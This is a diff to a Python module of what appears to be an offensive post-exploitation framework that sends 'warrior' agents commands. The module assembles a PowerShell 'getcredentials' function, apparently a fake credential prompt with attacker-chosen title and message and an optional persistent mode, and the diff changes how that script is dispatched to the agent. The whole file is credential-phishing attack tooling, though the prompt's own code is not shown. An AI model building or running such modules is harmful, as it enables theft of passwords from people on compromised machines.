@@ -1,6 +1,5 @@
 from termcolor import colored, cprint
 from module import Module
-from warrior_check import exist_warrior
 
 class CustomModule(Module):
 
@@ -21,8 +20,7 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        if exist_warrior(self.args["warrior"]):
-            function = """function getcredentials  {
+        function = """function getcredentials  {
                     param(
                     [Parameter(Mandatory)]
                     [String] $title,
@@ -49,14 +47,9 @@ class CustomModule(Module):
                 }
             """
 
-            if self.args["persistent"].lower() == "true":
-                function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "' -persistent"
-            else:
-                function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "'"
-
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
+        if self.args["persistent"].lower() == "true":
+            function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "' -persistent"
         else:
-            cprint ("[!] Failed... Warrior don't found", 'red')
+            function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "'"
+
+        super(CustomModule, self).run(function)
